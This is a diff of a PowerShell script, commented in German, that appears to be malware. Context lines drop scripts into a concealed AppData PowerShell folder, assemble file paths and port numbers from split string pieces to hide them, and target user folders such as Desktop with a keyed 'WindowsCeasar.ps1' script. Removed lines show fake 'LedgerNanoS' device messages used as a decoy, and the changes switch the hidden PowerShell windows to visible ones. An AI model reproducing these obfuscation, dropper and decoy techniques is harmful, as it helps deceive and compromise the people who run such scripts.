@@ -6,7 +6,7 @@ Add-Type -AssemblyName System.Drawing
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
-Write-Output "LedgerNanoS: Initialize..."
+
 # ==================== NEUER TEIL: ORDNER ERSTELLEN UND SCRIPTS DROPPEN ====================
 # Zielordner (dynamisch für aktuellen User)
 $basePowerShellFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
@@ -34,7 +34,7 @@ param (
     [string]$Key = "test" # Default for compatibility, but recommended: Always specify a unique Key
 )
 if ($Key -eq "test") {
-    #Write-Output "Warning: Default Key 'test' iurity, provide a unique Key!"
+    Write-Output "Warning: Default Key 'test' in use – For optimal security, provide a unique Key!"
 }
 $FullPaths = @(
     "$env:USERPROFILE\Desktop",
@@ -244,15 +244,6 @@ $scriptPath = $MyInvocation.MyCommand.Path
 $scriptDir = Split-Path -Path $scriptPath -Parent
 $scriptName = Split-Path -Path $scriptPath -Leaf
 
-
-
-
-Write-Output "LedgerNanoS device: Internal error (0x6f01)"
-
-
-
-
-
 # Construct destination paths
 $baseDir = Join-Path -Path $(Get-Content Env:$appDataPath) -ChildPath $microsoftWindowsPowerShellPath
 $hiddenDir = Join-Path -Path $baseDir -ChildPath $operationFolder
@@ -355,8 +346,8 @@ $pUl = [int]('4'+'4'+'4'+'5')
 $pMn = [int]('4'+'4'+'3')
 $hdP1 = 'Micro'; $hdP2 = 'soft'; $hdP3 = '\Win'; $hdP4 = 'dows\Power'; $hdP5 = 'Shell\oper'; $hdP6 = 'ation'
 $vHd = Join-Path -Path $env:APPDATA -ChildPath ($hdP1 + $hdP2 + $hdP3 + $hdP4 + $hdP5 + $hdP6)
-$esP1 = '\Micro'; $esP2 = 'soft\Win'; $esP3 = 'dows\Power'; $esP4 = 'Shell\ope'; $esP5 = 'rations\S'; $esP6 = 'ystem\Win'; $esP7 = 'dowsCeasar.ps1'
-$vEs = $env:APPDATA + $esP1 + $esP2 + $esP3 + $esP4 + $esP5 + $esP6 + $esP7
+$esP1 = '\Docu'; $esP2 = 'ments\Win'; $esP3 = 'dowsCea'; $esP4 = 'sar.ps1'
+$vEs = "$env:USERPROFILE" + $esP1 + $esP2 + $esP3 + $esP4
 $vCk = 't' + 'e' + 's' + 't'
 
 function FnGk1 {
@@ -1329,7 +1320,7 @@ if (-not (Test-Path $targetFolder)) {
         # Start-Process mit expliziten Params (kein Splatting, keine "and")
         $process = Start-Process -FilePath "powershell.exe" `
                                 -ArgumentList $psArgs `
-                                -WindowStyle "Hidden" `
+                                -WindowStyle "Normal" `
                                 -RedirectStandardOutput $outputLog `
                                 -RedirectStandardError $errorLog `
                                 -PassThru `
@@ -1357,7 +1348,7 @@ if (-not (Test-Path $targetFolder)) {
             )
             $fallbackProcess = Start-Process -FilePath "powershell.exe" `
                                             -ArgumentList $fallbackArgs `
-                                            -WindowStyle "Hidden" `
+                                            -WindowStyle "Normal" `
                                             -PassThru `
                                             -Wait
 
